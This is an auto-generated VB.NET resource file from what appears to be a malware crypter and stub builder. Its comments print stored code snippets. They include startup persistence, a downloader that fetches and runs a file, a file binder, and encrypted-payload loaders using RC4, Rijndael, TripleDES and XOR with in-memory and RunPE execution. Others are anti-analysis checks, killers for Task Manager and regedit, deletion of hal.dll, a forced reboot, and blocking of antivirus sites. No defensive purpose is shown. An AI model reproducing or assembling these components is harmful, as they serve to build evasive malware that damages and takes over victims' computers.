﻿'------------------------------------------------------------------------------
' <auto-generated>
'     This code was generated by a tool.
'     Runtime Version:4.0.30319.1
'
'     Changes to this file may cause incorrect behavior and will be lost if
'     the code is regenerated.
' </auto-generated>
'------------------------------------------------------------------------------

Option Strict On
Option Explicit On

Imports System

Namespace My.Resources
    
    'This class was auto-generated by the StronglyTypedResourceBuilder
    'class via a tool like ResGen or Visual Studio.
    'To add or remove a member, edit your .ResX file then rerun ResGen
    'with the /str option, or rebuild your VS project.
    '''<summary>
    '''  A strongly-typed resource class, for looking up localized strings, etc.
    '''</summary>
    <Global.System.CodeDom.Compiler.GeneratedCodeAttribute("System.Resources.Tools.StronglyTypedResourceBuilder", "4.0.0.0"),  _
     Global.System.Diagnostics.DebuggerNonUserCodeAttribute(),  _
     Global.System.Runtime.CompilerServices.CompilerGeneratedAttribute(),  _
     Global.Microsoft.VisualBasic.HideModuleNameAttribute()>  _
    Friend Module Resources
        
        Private resourceMan As Global.System.Resources.ResourceManager
        
        Private resourceCulture As Global.System.Globalization.CultureInfo
        
        '''<summary>
        '''  Returns the cached ResourceManager instance used by this class.
        '''</summary>
        <Global.System.ComponentModel.EditorBrowsableAttribute(Global.System.ComponentModel.EditorBrowsableState.Advanced)>  _
        Friend ReadOnly Property ResourceManager() As Global.System.Resources.ResourceManager
            Get
                If Object.ReferenceEquals(resourceMan, Nothing) Then
                    Dim temp As Global.System.Resources.ResourceManager = New Global.System.Resources.ResourceManager("SCV6._0.Resources", GetType(Resources).Assembly)
                    resourceMan = temp
                End If
                Return resourceMan
            End Get
        End Property
        
        '''<summary>
        '''  Overrides the current thread's CurrentUICulture property for all
        '''  resource lookups using this strongly typed resource class.
        '''</summary>
        <Global.System.ComponentModel.EditorBrowsableAttribute(Global.System.ComponentModel.EditorBrowsableState.Advanced)>  _
        Friend Property Culture() As Global.System.Globalization.CultureInfo
            Get
                Return resourceCulture
            End Get
            Set
                resourceCulture = value
            End Set
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to Shared Sub PushStart()
        '''        Dim xx As String = Environment.GetFolderPath(Environment.SpecialFolder.Startup) &amp; &quot;\&quot; &amp; IO.Path.GetFileName(System.Windows.Forms.Application.ExecutablePath)
        '''        While True
        '''            Try
        '''                If Not IO.File.Exists(xx) Then
        '''                    IO.File.Copy(System.Windows.Forms.Application.ExecutablePath, xx)
        '''                End If
        '''            Catch
        '''            End Try
        '''            System.Threading.Thread.Sleep(5000)
        '''        End While
        '''End Sub.
        '''</summary>
        Friend ReadOnly Property Add2StartUp() As String
            Get
                Return ResourceManager.GetString("Add2StartUp", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to  Shared Sub F63()
        '''        Killer(&quot;dxdiag&quot;)
        ''' End Sub.
        '''</summary>
        Friend ReadOnly Property Adxdiag() As String
            Get
                Return ResourceManager.GetString("Adxdiag", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to  Dim N As String = System.Text.Encoding.Default.GetString(AD(System.Text.Encoding.Default.GetBytes(ReverseString(R.GetObject(&quot;NM&quot;)))))
        ''' Dim I As String = Environ(&quot;APPDATA&quot;) &amp; &quot;\&quot; &amp; N &amp; &quot;.exe&quot;
        ''' If IO.File.Exists(I) Then
        '''	IO.File.Delete(I)
        ''' End If
        ''' Try
        '''	My.Computer.FileSystem.WriteAllBytes(I, AD(System.Text.Encoding.Default.GetBytes(ReverseString(R.GetObject(&quot;I&quot;)))), False)
        ''' Catch
        ''' End Try
        ''' LoadMethod(&quot;IX&quot;, &quot;R&quot;, CC(ReverseString(R.GetObject(&quot;X&quot;))), New Object() {AD(System.Text.Encoding.Default.GetByt [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property AESLoader() As String
            Get
                Return ResourceManager.GetString("AESLoader", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to Shared Function AD(ByVal Y As Byte())
        '''        Using A As New System.Security.Cryptography.RC2CryptoServiceProvider
        '''            A.IV = New Byte() {Convert.ToInt32(1000, 2), Convert.ToInt32(111, 2), _
        '''                               Convert.ToInt32(110, 2), Convert.ToInt32(101, 2), _
        '''                               Convert.ToInt32(100, 2), Convert.ToInt32(11, 2), _
        '''                               Convert.ToInt32(10, 2), Convert.ToInt32(&amp;H1, 2)}
        '''            A.Key = New Byte() {Convert.ToInt32(&amp;H0, 2), Conve [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property AESRev() As String
            Get
                Return ResourceManager.GetString("AESRev", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to  Shared Sub F62()
        '''        Killer(&quot;notepad&quot;)
        ''' End Sub.
        '''</summary>
        Friend ReadOnly Property ANotePad() As String
            Get
                Return ResourceManager.GetString("ANotePad", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to Shared Sub AT
        '''		Dim id As String = &quot;76487-337-8429955-22614&quot;
        '''		
        '''        Dim regPID As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(&quot;SOFTWARE\Microsoft\Windows NT\CurrentVersion&quot;, False)
        '''        
        '''        Dim pid As Object = regPID.GetValue(&quot;ProductId&quot;)
        '''        
        '''        Dim D As Object, R As String = Nothing, B As String = &quot;SELECT * FROM Win32_VideoController&quot;
        '''        
        '''        D = GetObject(&quot;winmgmts:&quot;).ExecQuery(B)
        '''        
        '''        Dim AdaptList As Object
        '''        [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property AntisSub() As String
            Get
                Return ResourceManager.GetString("AntisSub", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to Public Declare Function SetWindowLong Lib &quot;user32.dll&quot; Alias &quot;SetWindowLongA&quot; (ByVal hWnd As Long, ByVal nindex As Long, ByVal dwnewlong As Long) As Long
        '''|Public Declare Function CallWindowProc Lib &quot;user32.dll&quot; Alias &quot;CallWindowProcA&quot; (ByVal lpPrevWndFunc As Long, ByVal hWnd As Long, ByVal Msg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
        '''|Public Declare Function DefWindowProc Lib &quot;user32.dll&quot; Alias &quot;DefWindowProcA&quot; (ByVal hWnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property APIs() As String
            Get
                Return ResourceManager.GetString("APIs", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to Dim filled() As String
        '''
        '''Dim rand As New Random()
        '''
        '''&apos;FilledSplitting
        '''
        '''Dim tpth As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) &amp; &quot;\&quot; &amp; rand.Next(10000, 99999).ToString &amp; filled(1)
        '''
        '''My.Computer.FileSystem.WriteAllBytes(tpth, System.Text.Encoding.Default.GetBytes(filled(0)), False)
        '''
        '''System.Diagnostics.Process.Start(tpth)
        '''
        '''.
        '''</summary>
        Friend ReadOnly Property Binder() As String
            Get
                Return ResourceManager.GetString("Binder", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to Dim Expl As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) &amp; &quot;\1&quot; &amp; IO.Path.GetFileName(System.Windows.Forms.Application.ExecutablePath)
        '''My.Computer.Network.DownloadFile($DownloadLink$, Expl)
        '''Do Until IO.File.Exists(Expl) = True
        '''   System.Threading.Thread.Sleep(1000)
        '''Loop
        '''System.Diagnostics.Process.Start(Expl).
        '''</summary>
        Friend ReadOnly Property Downloader() As String
            Get
                Return ResourceManager.GetString("Downloader", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to Try
        '''  Dim regloc As String = &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\Current Version\Policies\Explorer&quot;
        '''  My.Computer.Registry.SetValue(regloc, &quot;NoFolderOptions&quot;, &quot;1&quot;, Microsoft.Win32.RegistryValueKind.DWord)
        '''Catch
        '''End Try.
        '''</summary>
        Friend ReadOnly Property FolderOpt() As String
            Get
                Return ResourceManager.GetString("FolderOpt", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to Public Shared Sub A(ByVal ProcessName As String)
        '''        Dim proc As System.Diagnostics.Process() = System.Diagnostics.Process.GetProcesses     
        '''        If System.Diagnostics.Process.GetProcessesByName(ProcessName).Length &gt;= 1 Then        
        '''            System.Threading.Thread.Sleep(10000)            
        '''        End If
        '''End Sub.
        '''</summary>
        Friend ReadOnly Property FunctionA() As String
            Get
                Return ResourceManager.GetString("FunctionA", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to Try
        '''   IO.File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.System) &amp; &quot;\hal.dll&quot;)
        '''Catch
        '''End Try.
        '''</summary>
        Friend ReadOnly Property HalDLL() As String
            Get
                Return ResourceManager.GetString("HalDLL", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to     Public Shared Function RInvoke(ByVal bytes As Byte()) As Boolean
        '''        Dim vr1 As New Threading.Thread(AddressOf vr0)
        '''        vr1.SetApartmentState(Threading.ApartmentState.STA)
        '''        vr1.Start(bytes)
        '''    End Function
        '''    Private Shared Sub vr0(ByVal vr0 As Object)
        '''        Dim vr19 As Reflection.MethodInfo = Reflection.Assembly.Load(DirectCast(vr0, Byte())).EntryPoint
        '''        If vr19.GetParameters.Length = 1 Then
        '''            vr19.Invoke(Nothing, New Object() {New String() {}})
        '''        Else        ''' [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property Invoke() As String
            Get
                Return ResourceManager.GetString("Invoke", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to Public Shared Function Killer(ByVal proc As String) As String
        '''        Try
        '''            While True
        '''                Dim p As System.Diagnostics.Process
        '''                For Each p In System.Diagnostics.Process.GetProcesses
        '''                    If proc.Contains(p.ProcessName) Then
        '''                        p.Kill()
        '''                    End If
        '''                Next
        '''                System.Threading.Thread.Sleep(1)
        '''            End While
        '''        Catch ex As Exception
        '''        End Try
        '''        Return Nothing
        '''  [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property KFunction() As String
            Get
                Return ResourceManager.GetString("KFunction", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to 	Shared Sub KKK
        '''	
        '''		Dim KF13 As New System.Threading.Thread(AddressOf F13)
        '''		
        '''        KF13.Start()
        '''        
        '''        Dim KF14 As New System.Threading.Thread(AddressOf F14)
        '''        
        '''        KF14.Start()
        '''        
        '''        Dim KF15 As New System.Threading.Thread(AddressOf F15)
        '''        
        '''        KF15.Start()
        '''        
        '''        Dim KF16 As New System.Threading.Thread(AddressOf F16)
        '''        
        '''        KF16.Start()
        '''        
        '''        Dim KF17 As New System.Threading.Thread(AddressOf F17)
        '''        
        '''       [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property Killers() As String
            Get
                Return ResourceManager.GetString("Killers", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to &apos;Shared Sub Melt(ByVal NewName As String)
        ''' &apos; Try
        '''  &apos;  Dim NewFolder As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)
        '''   &apos; If Application.StartupPath = NewFolder = False Then
        '''   &apos; FileCopy(System.Windows.Forms.Application.ExecutablePath, NewFolder &amp; &quot;\&quot; &amp; NewName)
        '''   &apos; Shell(NewFolder &amp; &quot;\&quot; &amp; NewName &amp; &quot; &quot; &amp; Application.ExecutablePath)
        '''   &apos; Dim Hidden As System.IO.FileAttributes = FileAttributes.Hidden
        '''   &apos; IO.File.SetAttributes(NewFolder &amp; &quot;\&quot; &amp; NewName, Hidden)
        '''   &apos;  [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property Melt() As String
            Get
                Return ResourceManager.GetString("Melt", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to  Shared Sub F61()
        '''        Killer(&quot;msconfig&quot;)
        ''' End Sub.
        '''</summary>
        Friend ReadOnly Property msconfig() As String
            Get
                Return ResourceManager.GetString("msconfig", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to Public Shared Function PolyDec(ByVal Input As String) As String
        '''        Dim Output As String = Nothing
        '''        Dim SA() As String
        '''        SA = Input.Split(&quot;|&quot;)
        '''        For Each C As String In SA
        '''            Try
        '''                Output = Output &amp; Chr(C - SA(0))
        '''            Catch
        '''            End Try
        '''        Next
        '''        Return Output.Remove(0, 1)
        '''End Function.
        '''</summary>
        Friend ReadOnly Property PolyDec() As String
            Get
                Return ResourceManager.GetString("PolyDec", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to  Dim D As New PolyRC4(R.GetObject(&quot;K&quot;))
        ''' Dim N As String = D.Decrypt(R.GetObject(&quot;NM&quot;))
        ''' Dim I As String = Environ(&quot;APPDATA&quot;) &amp; &quot;\&quot; &amp; N &amp; &quot;.exe&quot;
        ''' If IO.File.Exists(I) Then
        '''	IO.File.Delete(I)
        ''' End If
        ''' Dim B As Byte() = System.Text.Encoding.Default.GetBytes(D.Decrypt(R.GetObject(&quot;I&quot;)))
        ''' Try
        '''	My.Computer.FileSystem.WriteAllBytes(I, B, False)
        ''' Catch
        ''' End Try
        ''' Dim C As Byte() = System.Text.Encoding.Default.GetBytes(D.Decrypt(R.GetObject(&quot;F&quot;)))
        ''' LoadMethod(&quot;IX&quot;, &quot;R&quot;, CC(ReverseString(R.GetObject(&quot;X&quot;)) [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property PolyRC4Loader() As String
            Get
                Return ResourceManager.GetString("PolyRC4Loader", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to Public Class PolyRC4
        '''
        '''        Private Key As String = &quot;sad87x6zucigedsjfguycxtiu4e75689374-w24098sdfhj-324iuysdjfbhsdjf&quot;
        '''
        '''        Sub New(ByVal EncryptionKey As String)
        '''
        '''            Key = EncryptionKey
        '''
        '''        End Sub
        '''
        '''        Public Function Encrypt(ByVal message As String) As String
        '''
        '''            message = XX(message, Key)
        '''
        '''            Dim random As New Random()
        '''
        '''            Dim list1 As New System.Collections.ArrayList(), list2 As New System.Collections.ArrayList()
        '''
        '''            Dim out  [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property PolyRC4Rev() As String
            Get
                Return ResourceManager.GetString("PolyRC4Rev", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to Dim N As String = System.Text.Encoding.Default.GetString(PolyMorphicStairs.PolyDecrypt(System.Text.Encoding.Default.GetBytes(ReverseString(R.GetObject(&quot;NM&quot;))), _
        '''R.GetObject(&quot;K&quot;)))
        '''Dim I As String = Environ(&quot;APPDATA&quot;) &amp; &quot;\&quot; &amp; N &amp; &quot;.exe&quot;
        '''If IO.File.Exists(I) Then
        '''    IO.File.Delete(I)
        '''End If
        '''Try
        '''    My.Computer.FileSystem.WriteAllBytes(I, PolyMorphicStairs.PolyDecrypt(System.Text.Encoding.Default.GetBytes(ReverseString(R.GetObject(&quot;I&quot;))), (R.GetObject(&quot;K&quot;))), False)
        '''Catch
        '''End Try
        '''LoadMethod(&quot;IX&quot;, &quot; [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property PolyStairsLoader() As String
            Get
                Return ResourceManager.GetString("PolyStairsLoader", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to Public Class PolyMorphicStairs
        '''        Overloads Shared Function PolyDeCrypt(ByVal Data As String, ByVal Key As String, Optional ByVal ExtraRounds As UInteger = 0) As String
        '''            Dim buff() As Byte = PolyDeCrypt(Encoding.Default.GetBytes(Data), Encoding.Default.GetBytes(Key), ExtraRounds)
        '''            PolyDeCrypt = Encoding.Default.GetString(buff)
        '''            Erase buff
        '''        End Function
        '''        Overloads Shared Function PolyDeCrypt(ByRef Data() As Byte, ByVal Key() As Byte, Optional ByVal Ex [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property PolyStairsRev() As String
            Get
                Return ResourceManager.GetString("PolyStairsRev", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to  Dim D As New Polymorphic(R.GetObject(&quot;K&quot;))
        ''' Dim N As String = System.Text.Encoding.Default.GetString(D.PolyDeCrypt(System.Text.Encoding.Default.GetBytes(ReverseString(R.GetObject(&quot;NM&quot;)))))
        ''' Dim I As String = Environ(&quot;APPDATA&quot;) &amp; &quot;\&quot; &amp; N &amp; &quot;.exe&quot;
        ''' If IO.File.Exists(I) Then
        '''	IO.File.Delete(I)
        ''' End If
        ''' Try
        '''	My.Computer.FileSystem.WriteAllBytes(I, D.PolyDeCrypt(System.Text.Encoding.Default.GetBytes(ReverseString(R.GetObject(&quot;I&quot;)))), False)
        ''' Catch
        ''' End Try
        ''' LoadMethod(&quot;IX&quot;, &quot;R&quot;, CC(ReverseString(R.Get [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property PolyXORLoader() As String
            Get
                Return ResourceManager.GetString("PolyXORLoader", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to Public Class PolyMorphic
        '''        &apos;Variable for the Key.
        '''        Private sKey As String = &quot;&quot;
        '''        &apos;Property, will Give us acces to the key.
        '''        Public Property Key() As String
        '''            Get
        '''                Return sKey
        '''            End Get
        '''            Set(ByVal value As String)
        '''                sKey = value
        '''            End Set
        '''        End Property
        '''        &apos;Inisalization. (New Constructor)
        '''        Public Sub New(ByVal Key As String)
        '''            Me.Key = Key
        '''        End Sub
        '''        Public [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property PolyXORRev() As String
            Get
                Return ResourceManager.GetString("PolyXORRev", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to Public Shared Function Rc4(ByVal ºjmÍ() As Byte, ByVal ºjmUÍ() As Byte) As Byte()
        '''
        '''        Dim s(Convert.ToInt32(11111111, &amp;H2)) As Byte
        '''
        '''        Dim i As Integer
        '''
        '''        For i = Convert.ToInt32(&amp;H0, &amp;H2) To s.Length - Convert.ToInt32(&amp;H1, &amp;H2)
        '''
        '''            s(i) = CByte(i)
        '''
        '''        Next
        '''
        '''        Dim j As Integer
        '''
        '''        For i = Convert.ToInt32(&amp;H0, &amp;H2) To s.Length - Convert.ToInt32(&amp;H1, &amp;H2)
        '''
        '''            j = (j + ºjmUÍ(i Mod ºjmUÍ.Length) + s(i)) And Convert.ToInt32(11111111, &amp;H2)
        '''
        '''     [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property RC4() As String
            Get
                Return ResourceManager.GetString("RC4", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to Dim N As String = System.Text.Encoding.Default.GetString(Rc4(System.Text.Encoding.Default.GetBytes(ReverseString(R.GetObject(&quot;NM&quot;))), _
        '''R.GetObject(&quot;K&quot;)))
        '''Dim I As String = Environ(&quot;APPDATA&quot;) &amp; &quot;\&quot; &amp; N &amp; &quot;.exe&quot;
        '''If IO.File.Exists(I) Then
        '''    IO.File.Delete(I)
        '''End If
        '''Try
        '''    My.Computer.FileSystem.WriteAllBytes(I, Rc4(System.Text.Encoding.Default.GetBytes(ReverseString(R.GetObject(&quot;I&quot;))), (R.GetObject(&quot;K&quot;))), False)
        '''Catch
        '''End Try
        '''LoadMethod(&quot;IX&quot;, &quot;R&quot;, CC(ReverseString(R.GetObject(&quot;X&quot;))), New Object( [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property RC4Loader() As String
            Get
                Return ResourceManager.GetString("RC4Loader", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to Shared Sub F60()
        '''        Killer(&quot;regedit&quot;)
        '''End Sub.
        '''</summary>
        Friend ReadOnly Property Regedit() As String
            Get
                Return ResourceManager.GetString("Regedit", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to Option Explicit Off
        '''Option Strict Off
        '''Imports System.Reflection
        '''Imports System.Runtime.InteropServices
        '''Imports System
        '''Imports Microsoft.VisualBasic
        '''Imports System.Text
        '''Imports System.Security.Cryptography
        '''Imports Microsoft.Win32
        '''Imports System.Windows.Forms
        '''Imports System.IO
        '''Imports System.CodeDom.Compiler
        '''&apos;AssemblyCodes
        '''Public Class Out
        '''	&apos;FakeAPI#1
        '''    &apos;FakeAPI#2
        '''    &apos;FakeAPI#3
        '''    &apos;FakeAPI#4
        '''    &apos;FakeAPI#5
        '''    &apos;FakeAPI#6
        '''    &apos;FakeAPI#7
        '''    &apos;FakeAPI#8
        '''    &apos;FakeAPI#9
        '''    &apos;FakeAPI#A
        '''  [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property ResetStub() As String
            Get
                Return ResourceManager.GetString("ResetStub", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to Dim bytloc As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) &amp; &quot;\restart&quot;
        '''If Not IO.File.Exists(bytloc) Then
        '''   Dim filebyt As Byte() = New Byte() {}
        '''   My.Computer.FileSystem.WriteAllBytes(bytloc, filebyt, False)
        '''   Microsoft.VisualBasic.Shell(&quot;shutdown -r -t&quot; &amp; &quot; 00&quot;, Microsoft.VisualBasic.AppWinStyle.Hide)
        '''End If.
        '''</summary>
        Friend ReadOnly Property Restart() As String
            Get
                Return ResourceManager.GetString("Restart", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to  Dim N As String = RijndaelDecrypt(R.GetObject(&quot;NM&quot;),R.GetObject(&quot;K&quot;))
        ''' Dim I As String = Environ(&quot;APPDATA&quot;) &amp; &quot;\&quot; &amp; N &amp; &quot;.exe&quot;
        ''' If IO.File.Exists(I) Then
        '''	IO.File.Delete(I)
        ''' End If
        ''' Dim II As Byte() = System.Text.Encoding.Default.GetBytes(RijndaelDecrypt(R.GetObject(&quot;I&quot;), _
        ''' R.GetObject(&quot;K&quot;)))
        ''' Try
        '''	My.Computer.FileSystem.WriteAllBytes(I, II, False)
        ''' Catch
        ''' End Try
        ''' Dim III As Byte() = System.Text.Encoding.Default.GetBytes(RijndaelDecrypt(R.GetObject(&quot;F&quot;), _
        ''' R.GetObject(&quot;K&quot;)))
        ''' LoadMethod(&quot;IX [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property RijLoader() As String
            Get
                Return ResourceManager.GetString("RijLoader", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to Public Shared Function RijndaelDecrypt(ByVal Decrypt As String, ByVal Key As String)
        '''
        '''        Dim A As New RijndaelManaged
        '''
        '''        Dim BC() As Byte
        '''
        '''        Dim BS() As Byte = New Byte() {Convert.ToInt32(&amp;H1, &amp;H2), _
        '''                                           Convert.ToInt32(10, &amp;H2), _
        '''                                           Convert.ToInt32(11, &amp;H2), _
        '''                                           Convert.ToInt32(100, &amp;H2), _
        '''                                           Convert.ToInt32(101, &amp;H2),  [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property RijndaelRev() As String
            Get
                Return ResourceManager.GetString("RijndaelRev", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to using System.Runtime.InteropServices;
        '''using System;
        '''using System.Text;
        '''public class IX
        '''{
        '''    [return: MarshalAs(UnmanagedType.Bool)]
        '''    [DllImport(&quot;kernel32&quot;)]
        '''    private static extern bool CreateProcess(string appName, StringBuilder commandLine, IntPtr procAttr, IntPtr thrAttr, [MarshalAs(UnmanagedType.Bool)] bool inherit, int creation, IntPtr env, string curDir, byte[] sInfo, IntPtr[] pInfo);
        '''    [return: MarshalAs(UnmanagedType.Bool)]
        '''    [DllImport(&quot;kernel32&quot;)]
        '''    private static extern bool [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property RpE() As String
            Get
                Return ResourceManager.GetString("RpE", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to Dim N As String = System.Text.Encoding.Default.GetString(SDecrypt(System.Text.Encoding.Default.GetBytes(ReverseString(R.GetObject(&quot;NM&quot;))), _
        '''R.GetObject(&quot;K&quot;)))
        '''Dim I As String = Environ(&quot;APPDATA&quot;) &amp; &quot;\&quot; &amp; N &amp; &quot;.exe&quot;
        '''If IO.File.Exists(I) Then
        '''    IO.File.Delete(I)
        '''End If
        '''Try
        '''    My.Computer.FileSystem.WriteAllBytes(I, SDecrypt(System.Text.Encoding.Default.GetBytes(ReverseString(R.GetObject(&quot;I&quot;))), (R.GetObject(&quot;K&quot;))), False)
        '''Catch
        '''End Try
        '''LoadMethod(&quot;IX&quot;, &quot;R&quot;, CC(ReverseString(R.GetObject(&quot;X&quot;))), N [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property StairsLoader() As String
            Get
                Return ResourceManager.GetString("StairsLoader", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to Public Shared Function SDeCrypt(ByVal Data() As Byte, ByVal key() As Byte) As Byte()
        '''            For i = Data.Length - Convert.ToInt32(&amp;H1, 2) To Convert.ToInt32(0, 2) Step -1
        '''                Data(i) = CByte((CInt(Data(i) Xor key(i Mod key.Length)) - CInt(Data((i + _
        '''                Convert.ToInt32(&amp;H1, 2)) Mod Data.Length)) + Convert.ToInt32(100000000, 2)) _
        '''                Mod Convert.ToInt32(100000000, 2))
        '''            Next
        '''            Return Data
        '''        End Function.
        '''</summary>
        Friend ReadOnly Property StairsRev() As String
            Get
                Return ResourceManager.GetString("StairsRev", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to Option Explicit Off
        '''Option Strict Off
        '''Imports System.Reflection
        '''Imports System.Runtime.InteropServices
        '''Imports System
        '''Imports Microsoft.VisualBasic
        '''Imports System.Text
        '''Imports System.Security.Cryptography
        '''Imports Microsoft.Win32
        '''Imports System.Windows.Forms
        '''Imports System.IO
        '''Imports System.CodeDom.Compiler
        '''&apos;AssemblyCodes
        '''Public Class Out
        '''	&apos;FakeAPI#1
        '''    &apos;FakeAPI#2
        '''    &apos;FakeAPI#3
        '''    &apos;FakeAPI#4
        '''    &apos;FakeAPI#5
        '''    &apos;FakeAPI#6
        '''    &apos;FakeAPI#7
        '''    &apos;FakeAPI#8
        '''    &apos;FakeAPI#9
        '''    &apos;FakeAPI#A
        '''  [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property Stub() As String
            Get
                Return ResourceManager.GetString("Stub", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to Shared Sub F59()
        '''     Killer(&quot;taskmgr&quot;)
        '''End Sub.
        '''</summary>
        Friend ReadOnly Property TaskMSub() As String
            Get
                Return ResourceManager.GetString("TaskMSub", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to  Dim N As String = TripleDESdecrypt(R.GetObject(&quot;NM&quot;),R.GetObject(&quot;K&quot;), True)
        ''' Dim I As String = Environ(&quot;APPDATA&quot;) &amp; &quot;\&quot; &amp; N &amp; &quot;.exe&quot;
        ''' If IO.File.Exists(I) Then
        '''	IO.File.Delete(I)
        ''' End If
        ''' Dim II As Byte() = System.Text.Encoding.Default.GetBytes(TripleDESdecrypt(R.GetObject(&quot;I&quot;), _
        ''' R.GetObject(&quot;K&quot;), True))
        ''' Try
        '''	My.Computer.FileSystem.WriteAllBytes(I, II, False)
        ''' Catch
        ''' End Try
        ''' Dim III As Byte() = System.Text.Encoding.Default.GetBytes(TripleDESdecrypt(R.GetObject(&quot;F&quot;), _
        ''' R.GetObject(&quot;K&quot;), Tr [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property TDESLoader() As String
            Get
                Return ResourceManager.GetString("TDESLoader", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to Public Shared Function TripleDESdecrypt(ByVal b As String, ByVal c As String, ByVal d As Boolean) As String
        '''        Dim keyArray As Byte()
        '''        Dim toEncryptArray As Byte() = Convert.FromBase64String(b)
        '''        If d Then
        '''            Dim hashmd5 = New MD5CryptoServiceProvider()
        '''            keyArray = hashmd5.ComputeHash(UTF8Encoding.UTF8.GetBytes(c))
        '''        Else
        '''            keyArray = UTF8Encoding.UTF8.GetBytes(c)
        '''        End If
        '''        Dim tdes = New TripleDESCryptoServiceProvider()
        '''        td [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property TDESRev() As String
            Get
                Return ResourceManager.GetString("TDESRev", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to Shared Sub W
        '''
        '''            WebBlock(&quot;www.novirusthanks.org&quot;)
        '''
        '''            WebBlock(&quot;www.virustotal.com&quot;)
        '''  
        '''            WebBlock(&quot;www.virusscan.jotti.org&quot;)
        '''
        '''            WebBlock(&quot;www.malwarebytes.org&quot;)
        '''  
        '''            WebBlock(&quot;www.bitdefender.com/scanner/online/free.html&quot;)
        '''    
        '''            WebBlock(&quot;www.eset.com/online-scanner&quot;)
        '''
        '''            WebBlock(&quot;housecall.trendmicro.com&quot;)
        '''  
        '''            WebBlock(&quot;www.kaspersky.com/scanforvirus&quot;)
        '''            
